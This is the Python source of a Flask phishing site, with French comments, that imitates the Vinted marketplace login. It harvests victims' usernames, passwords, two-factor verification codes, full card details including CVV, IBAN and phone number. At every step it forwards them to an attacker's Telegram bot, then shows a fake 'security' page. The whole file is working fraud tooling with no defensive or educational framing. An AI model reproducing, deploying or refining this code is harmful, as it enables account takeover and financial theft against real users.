from flask import Flask, request, redirect, render_template, url_for
import os
import requests
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")


def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        response = requests.post(url, data=data)
        response.raise_for_status()
        print("Message Telegram envoyé avec succès.")
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors de l'envoi du message Telegram: {e}")


@app.route("/", methods=["GET"])
def home():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # Envoie le message Telegram après la soumission du login
    message = (
        f"[Vinted Login]\n"
        f"👤 Pseudo: {username}\n"
        f"🔑 Mdp: {password}"
    )
    send_telegram_message(message)

    # Redirige vers la page de vérification en passant les données
    return render_template("verify.html", username=username, password=password)


@app.route("/verify", methods=["POST"])
def verify():
    username = request.form["username"]
    password = request.form["password"]
    verification_code = request.form["verification_code"]

    # Envoie le message du code de vérification à Telegram
    message = (
        f"[Vinted Code Verification]\n"
        f"👤 Pseudo: {username}\n"
        f"🔑 Mdp: {password}\n"
        f"🔢 Code: {verification_code}"
    )
    send_telegram_message(message)

    # Redirige l'utilisateur vers la page d'informations de paiement
    return render_template(
        "payment_info.html",
        username=username,
        password=password,
        verification_code=verification_code
    )


@app.route("/process_payment", methods=["POST"])
def process_payment():
    # Récupère toutes les données, y compris celles des pages précédentes (via champs cachés)
    username = request.form.get("username")
    password = request.form.get("password")
    verification_code = request.form.get("verification_code")

    card_name = request.form["card_name"]
    card_number = request.form["card_number"]
    expiry_date = request.form["expiry_date"]
    cvv = request.form["cvv"]
    iban = request.form["iban"]

    # **** CORRECTION ICI : RÉCUPÉRATION DU NUMÉRO DE TÉLÉPHONE ****
    phone_number = request.form.get("phone_number")
    # ***************************************************************

    # Formate le message complet de la carte bancaire pour Telegram
    message = (
        f"[Vinted Payment Info]\n"
        f"👤 Pseudo: {username or 'N/A'}\n"
        f"🔑 Mdp: {password or 'N/A'}\n"
        f"🔢 Code Verif: {verification_code or 'N/A'}\n"
        f"💳 Nom sur carte: {card_name}\n"
        f"🔢 Num carte: {card_number}\n"
        f"📅 Exp: {expiry_date}\n"
        f"🔐 CVV: {cvv}\n"
        f"🏦 IBAN: {iban}\n"
        f"📞 Téléphone: {phone_number or 'N/A'}"  # **** CORRECTION ICI : AJOUT AU MESSAGE ****
    )

    # Envoie le message à Telegram
    send_telegram_message(message)

    # Redirige l'utilisateur vers la page de sécurisation
    return redirect(url_for('security_page'))


# Route pour la page de sécurisation finale
@app.route("/page_de_securisation")
def security_page():
    return render_template("security_page.html")


if __name__ == "__main__":
    app.run(debug=True)